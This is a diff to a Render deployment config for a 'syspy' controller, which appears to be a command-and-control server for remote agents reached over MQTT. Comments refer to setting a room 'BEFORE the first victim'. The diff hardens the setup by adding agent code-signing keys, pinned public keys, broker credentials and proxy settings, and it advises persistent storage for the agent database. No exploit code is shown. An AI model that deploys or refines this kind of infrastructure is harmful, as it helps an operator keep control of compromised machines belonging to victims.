@@ -6,22 +6,40 @@ services:
     buildCommand: pip install -r requirements.txt
     startCommand: python controller.py --host 0.0.0.0 --no-browser
     healthCheckPath: /api/health
+    # ---------------------------------------------------------------------
+    # A Render disk needs a paid plan, but SYSPY_DATA MUST be persistent.
+    # On the free tier /opt/render/project/src/data is wiped on every deploy,
+    # which rotates the dashboard password, invalidates every session and
+    # throws away agents_db.json (nicknames, groups, tree). Move to
+    # plan: starter and mount a disk at /var/data, then set
+    #   SYSPY_DATA=/var/data
+    # ---------------------------------------------------------------------
     envVars:
       - key: PYTHON_VERSION
         value: "3.12.8"
-      - key: SYSPY_HOST                 # PATCH-01: without this the deploy is unhealthy
+      - key: SYSPY_HOST
         value: 0.0.0.0
-      - key: SYSPY_CLIENT_ID            # PATCH-08: stable MQTT session across deploys
+      - key: SYSPY_CLIENT_ID
         value: syspy-controller-1
       - key: SYSPY_DATA
         value: /opt/render/project/src/data
-      - key: SYSPY_PASSWORD             # else a new random password every boot
+      - key: SYSPY_TRUST_PROXY_HOPS   # Render puts exactly one proxy in front
+        value: "1"
+      - key: SYSPY_PASSWORD           # else a new random password every boot
         sync: false
-      - key: SYSPY_URL                  # https://<app>.onrender.com
+      - key: SYSPY_URL                # https://<app>.onrender.com
         sync: false
-      - key: SYSPY_ROOM                 # set BEFORE the first victim, never change
+      - key: SYSPY_ROOM               # set BEFORE the first victim, never change
         sync: false
-      - key: SYSPY_PASS                 # same
+      - key: SYSPY_PASS               # same
         sync: false
-      - key: SYSPY_BROKER               # host:port:tls (e.g. broker.emqx.io:8883:1 or self-hosted Mosquitto)
+      - key: SYSPY_SIGN_KEY           # 64 hex chars; python patch.py --genkey
+        sync: false
+      - key: SYSPY_PUBKEY             # matching 64 hex chars, pin on agents
+        sync: false
+      - key: SYSPY_BROKER             # host:port:tls (self-hosted Mosquitto recommended)
+        sync: false
+      - key: SYSPY_BROKER_USER
+        sync: false
+      - key: SYSPY_BROKER_PASS
         sync: false
